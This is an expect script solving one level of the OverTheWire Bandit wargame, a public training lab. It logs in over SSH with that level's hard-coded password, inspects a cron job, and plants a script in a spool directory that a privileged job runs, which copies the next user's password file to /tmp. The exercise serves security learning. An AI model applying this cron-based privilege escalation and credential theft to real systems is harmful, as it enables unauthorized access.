#!/usr/bin/expect -f

spawn ssh -p 2220 bandit23@bandit.labs.overthewire.org
expect "*: "
send "jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n\r"
expect "*\$ "

send "cat /etc/cron.d/cronjob_bandit24\r"
expect "*\$ "

send "cat /usr/bin/cronjob_bandit24.sh\r"
expect "*\$ "

# send "echo I am user bandit23 | md5sum | cut -d ' ' -f 1\r"
# expect "*\$ "

send "cat << EOF > /var/spool/bandit24/exploit.sh\r"
send "#!/bin/bash\r"
send "cat /etc/bandit_pass/bandit24 > /tmp/exfil.txt\r"
send "EOF\r"

send "chmod u+x /var/spool/bandit24/exploit.sh\r"

# send "cat /tmp/8ca319486bfbbc3663ea0fbe81326349\r"
# expect "*\$ "

interact
